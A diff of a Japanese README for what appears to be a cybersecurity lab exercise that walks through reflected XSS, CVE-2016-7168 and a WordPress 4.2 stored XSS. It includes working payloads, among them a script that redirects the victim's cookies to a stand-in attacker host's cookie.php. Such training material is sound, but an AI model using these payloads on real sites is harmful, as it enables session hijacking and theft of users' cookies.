@@ -43,9 +43,11 @@ Target OSに設置されたウェブサーバは入力された文字列を表�
 ### Steps
 1. ht&#8203;tp://target.cyexc-target:8000/php/xss.phpにアクセスする。
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/xss.png" title="Screenshot1">
+
 2. `"><script>alert(document.cookie)</script><!--`を入力する。
 クッキー情報がポップアップ表示される。
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie1.png" title="Screenshot2">
+
 3. `"><script>window.location='http://attacker.cyexc-attacker:8081/cookie.php?c='+document.cookie;</script><!--`を入力する。
 Attacker OSのクッキー情報を窃取するPHPコード（cookie.php）が実行される。
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/cookie2.png" title="Screenshot3">
@@ -142,7 +144,7 @@ Target OSに設置されたWordPressサーバに不正な入力を含むリク�
 CVE-2016-7168は、XSSコードが含まれている画像ファイル名におけるWordPressの重大なXSSの脆弱性である。
 
 ### Steps
-1. Browse to http://target.cyexc-target:8000
+1. Browse to ht&#8203;tp://target.cyexc-target:8000
 2. ファイル名にXSSコードが含まれている画像をWordPress記事に添付する。
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex3/images/post.png" title="Screenshot4">
 3. プレビュー画面に遷移する。
@@ -152,7 +154,7 @@ CVE-2016-7168は、XSSコードが含まれている画像ファイル名にお�
 WordPress 4.2 Stored XSSは、WordPressに投稿された記事のコメント欄にJavaScriptと64KB以上の文字列を一緒に投稿することで、コメント欄を表示したTarget OSのブラウザ上で任意のJavaScriptを実行することができる。
 
 ### Steps
-1. Browse to http://target.cyexc-target:8000
+1. Browse to ht&#8203;tp://target.cyexc-target:8000
 2. WordPressに投稿された記事のコメント欄にJavaScriptと64KB以上の文字列を一緒に投稿する。
 `<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
 64KB以上の文字列は下記のようなPythonスクリプトで作成した。
